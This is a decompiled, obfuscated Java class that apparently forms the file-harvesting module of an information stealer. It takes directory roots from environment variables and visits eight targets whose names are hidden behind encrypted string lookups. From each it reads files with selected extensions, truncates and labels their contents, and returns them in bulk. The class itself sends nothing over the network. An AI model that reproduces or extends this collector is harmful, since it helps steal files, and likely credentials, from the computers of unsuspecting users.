/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;

public final class ah {
    public static List<b> a() {
        Object object;
        a[] aArray = System.getenv($S.d(211));
        if (aArray == null) {
            aArray = "";
        }
        if ((object = System.getenv($S.d(212))) == null) {
            object = "";
        }
        aArray = new a[]{new a($S.d(823), new String[]{(String)aArray + $S.d(824), (String)object + $S.d(824)}, new String[]{$S.d(446), $S.d(587), $S.d(586)}), new a($S.d(825), new String[]{(String)aArray + $S.d(826), (String)object + $S.d(826)}, new String[]{$S.d(446), $S.d(587)}), new a($S.d(827), new String[]{(String)aArray + $S.d(828)}, new String[]{$S.d(446), $S.d(586)}), new a($S.d(829), new String[]{(String)aArray + $S.d(830)}, new String[]{$S.d(446), $S.d(587)}), new a($S.d(831), new String[]{(String)object + $S.d(832)}, new String[]{$S.d(446), $S.d(587), $S.d(586)}), new a($S.d(833), new String[]{(String)aArray + $S.d(834)}, new String[]{$S.d(446)}), new a($S.d(835), new String[]{$S.d(836), $S.d(837)}, new String[]{$S.d(695), $S.d(707), $S.d(685), $S.d(688)}), new a($S.d(838), new String[]{(String)aArray + $S.d(839)}, new String[]{$S.d(707)})};
        object = new ArrayList();
        int cfr_ignored_0 = aArray.length;
        for (int i2 = 0; i2 < 8; ++i2) {
            a a2 = aArray[i2];
            HashSet<String> hashSet = new HashSet<String>(Arrays.asList(a2.c));
            StringBuilder stringBuilder = new StringBuilder();
            Object object2 = a2.b;
            int n2 = a2.b.length;
            for (int i3 = 0; i3 < n2; ++i3) {
                File[] fileArray = object2[i3];
                if (!(fileArray = new File((String)fileArray)).exists() || (fileArray = fileArray.listFiles()) == null) continue;
                for (File file : fileArray) {
                    String string;
                    if (!file.isFile()) continue;
                    int n3 = file.getName().lastIndexOf(46);
                    String string2 = string = n3 >= 0 ? file.getName().substring(n3).toLowerCase() : "";
                    if (!hashSet.contains(string)) continue;
                    try {
                        string = new String(Files.readAllBytes(file.toPath()), $S.d(399));
                        if (string.length() > 5000) {
                            string = string.substring(0, 5000);
                        }
                        stringBuilder.append("[").append(file.getName()).append("]\n").append(string).append("\n\n");
                        if (stringBuilder.length() <= 204800) continue;
                        break;
                    }
                    catch (Exception exception) {}
                }
                if (stringBuilder.length() > 0) break;
            }
            if (stringBuilder.length() <= 0) continue;
            object2 = new b();
            new b().a = a2.a;
            object2.b = stringBuilder.toString();
            object.add(object2);
        }
        return object;
    }

    static final class a {
        String a;
        String[] b;
        String[] c;

        a(String string, String[] stringArray, String[] stringArray2) {
            this.a = string;
            this.b = stringArray;
            this.c = stringArray2;
        }
    }

    public static final class b {
        public String a;
        public String b;
    }
}

